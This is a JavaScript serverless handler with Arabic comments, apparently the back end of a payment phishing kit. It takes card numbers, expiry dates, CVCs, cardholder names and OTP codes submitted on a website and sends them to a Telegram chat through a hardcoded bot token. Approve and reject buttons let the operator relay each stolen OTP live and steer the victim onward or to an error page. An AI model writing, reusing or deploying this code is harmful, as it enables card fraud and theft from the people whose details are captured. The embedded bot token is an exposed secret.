global.userStatuses = global.userStatuses || {};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  
  const data = req.body;

  // إذا كان الطلب قادماً من تليجرام (عندما تضغط أنت على الأزرار)
  if (data.callback_query) {
    const callback = data.callback_query;
    const callbackData = callback.data;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    let responseText = callback.message.text;

    if (callbackData.startsWith('approve_otp_') || callbackData.startsWith('approve_pay_')) {
      const userId = callbackData.replace('approve_otp_', '').replace('approve_pay_', '');
      global.userStatuses[userId] = 'approved';
      responseText += "\n\n✅ **[تمت الموافقة بنجاح الانتقال للفاتورة]**";
    } else if (callbackData.startsWith('reject_otp_') || callbackData.startsWith('reject_pay_')) {
      const userId = callbackData.replace('reject_otp_', '').replace('reject_pay_', '');
      global.userStatuses[userId] = 'rejected';
      responseText += "\n\n❌ **[تم رفض الطلب وإظهار خطأ للعميل]**";
    }

    // تعديل الرسالة في تليجرام لإزالة الأزرار
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: responseText,
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل ردك!" })
    });

    return res.status(200).json({ ok: true });
  }

  // إذا كان الطلب قادماً من الموقع (إرسال فيزا أو OTP جديد)
  let text = '';
  let keyboard = null;

  if (data.رمز_التحقق_OTP) {
    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
           `🔑 الكود المدخل: \`${data.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${data.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${data.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${data.user_id || 'غير متوفر'}\``;

    keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${data.user_id}` },
          { text: "❌ رفض", callback_data: `reject_otp_${data.user_id}` }
        ]
      ]
    };
  } else {
    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
           `👤 الاسم: ${data.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${data.card_number || ''}\`\n` +
           `📅 الانتهاء: ${data.exp_date || ''}\n` +
           `🔒 CVC: \`${data.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${data.user_id}\``;

    keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_pay_${data.user_id}` },
          { text: "❌ رفض", callback_data: `reject_pay_${data.user_id}` }
        ]
      ]
    };
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
    
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
